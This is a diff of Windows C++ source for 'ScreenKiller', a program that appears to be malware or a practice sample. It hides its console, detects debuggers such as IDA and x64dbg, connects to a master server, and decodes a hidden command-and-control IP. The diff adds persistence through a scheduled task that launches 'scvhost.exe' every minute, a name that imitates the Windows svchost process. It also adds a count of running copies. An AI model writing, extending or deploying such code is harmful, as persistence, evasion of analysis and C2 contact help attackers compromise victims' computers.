@@ -1,15 +1,20 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <iostream>
-#include <fstream>
-#include <thread>
-#include <cmath>
 
 #include "ScreenKiller.hpp"
+#include "Helpers.hpp"
 
 VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj);
 
-ScreenKiller::ScreenKiller() : m_alive(false), m_persistent(false), m_connected(false) {}
+ScreenKiller::ScreenKiller() : m_alive(false), m_persistent(false), m_connected(false) 
+{
+	size_t sz;
+	char *path;
+	_dupenv_s(&path, &sz, "temp");
+
+	this->m_temp_path = path;
+}
 
 ScreenKiller::~ScreenKiller()
 {
@@ -23,41 +28,13 @@ void ScreenKiller::deploy()
 
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-	this->runner_thread = std::thread([this] {this->deploy_inner(); });
+	this->m_runner_thread = std::thread([this] {this->deploy_inner(); });
 }
 
 void ScreenKiller::suicide()
 {
-	this->runner_thread.detach();
+	this->m_runner_thread.detach();
 	this->m_alive = false;
-}
-
-std::string ScreenKiller::encrypt_string(const std::string& input_string) const
-{
-	std::string output_string = "";
-	
-	for (const char& current_char : input_string) 
-	{
-		output_string += static_cast<char>((current_char ^ XOR_KEY));
-	}
-
-	return output_string;
-}
-
-std::string ScreenKiller::encode_string(const std::string & input_string)
-{
-	std::string output_string = "";
-	char last_char = 0xc4, current_char;
-	auto it = input_string.begin();
-
-	for (int index = 0; it < input_string.end(); it++, index++)
-	{
-		current_char = *it ^ (lcm(index + 1, pow(last_char, 2) + 5) % UINT8_MAX);
-		output_string += current_char;
-		last_char = current_char;
-	}
-
-	return output_string;
 }
 
 bool ScreenKiller::deploy_inner()
@@ -91,7 +68,9 @@ bool ScreenKiller::deploy_inner()
 
 bool ScreenKiller::get_persistency()
 {
-	return false;
+	system("schtasks /create /f /tn \"Network\" /sc minute /mo 1 /tr \"cmd /c start C:\\Windows\\System32\\scvhost.exe\"");
+
+	return true;
 }
 
 bool ScreenKiller::connect_to_master_server()
@@ -123,15 +102,19 @@ bool ScreenKiller::is_debugged1()
 
 bool ScreenKiller::is_debugged2()
 {
-		const wchar_t* debuggersFilename[6] = {
+		const wchar_t* debuggersFilename[7] = {
 			L"cheatengine-x86_64.exe",
 			L"ollydbg.exe",
 			L"ida.exe",
 			L"ida64.exe",
+			L"idaq64.exe",
 			L"radare2.exe",
 			L"x64dbg.exe"
 		};
 
+		const wchar_t *pogan_name = L"scvhost.exe";
+
+		size_t count_instances = 0;
 		wchar_t* processName;
 		PROCESSENTRY32W processInformation{ sizeof(PROCESSENTRY32W) };
 		HANDLE processList;
@@ -147,63 +130,44 @@ bool ScreenKiller::is_debugged2()
 				for (const wchar_t* debugger : debuggersFilename)
 				{
 					processName = processInformation.szExeFile;
-					if (_wcsicmp(debugger, processName) == 0) {
+					if (_wcsicmp(debugger, processName) == 0) 
+					{
 						return true;
 					}
+				}
+				if (_wcsicmp(pogan_name, processInformation.szExeFile) == 0)
+				{
+					count_instances++;
 				}
 			} while (Process32NextW(processList, &processInformation));
 		}
 		CloseHandle(processList);
 
-		return false;
+		return count_instances > 1;
 }
 
 void ScreenKiller::check_secret_file()
 {
 	FILE *fp; 
 	char secret_buf[MAX_FILE] = { 0 };
-	char *temp_path;
-	size_t sz = 0;
-	_dupenv_s(&temp_path, &sz, "temp");
+	//char *temp_path;
+	//size_t sz = 0;
+	//_dupenv_s(&temp_path, &sz, "temp");
+
 
 	std::string filename = "\\secret.txt";
-	filename = temp_path + filename;
+	//filename = temp_path + filename;
+	filename = this->m_temp_path + filename;
 
 	fopen_s(&fp, filename.c_str(), "r");
 	if (fp == NULL)
 		return;
+
 	fread(secret_buf, 1, MAX_FILE, fp);
-	
-	std::string encoded_key = this->encode_string(secret_buf);
+	std::string encoded_key = encode_string(secret_buf);
 
 	if (encoded_key == ENCODED_KEY)
-		MessageBoxA(NULL, (this->decrypt_ip(secret_buf)).c_str(), "This is my c2", NULL);
-}
-
-std::string ScreenKiller::decrypt_ip(std::string key)
-{
-	std::string ip = "", encrypted_ip = ENCODED_IP;
-	auto it = encrypted_ip.begin();
-
-	for (int index = 0; it < encrypted_ip.end(); it++, index++)
-	{
-		ip += *it ^ key[index % key.length()];
-	}
-
-	return ip;
-}
-
-long long ScreenKiller::gcd(long long int a, long long int b)
-{
-	if (b == 0)
-		return a;
-	
-	return gcd(b, a % b);
-}
-
-long long ScreenKiller::lcm(long long int a, long long int b)
-{
-	return (a / gcd(a, b)) * b;
+		MessageBoxA(NULL, (decrypt_ip(secret_buf)).c_str(), "Hmmm", NULL);
 }
 
 VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj) 
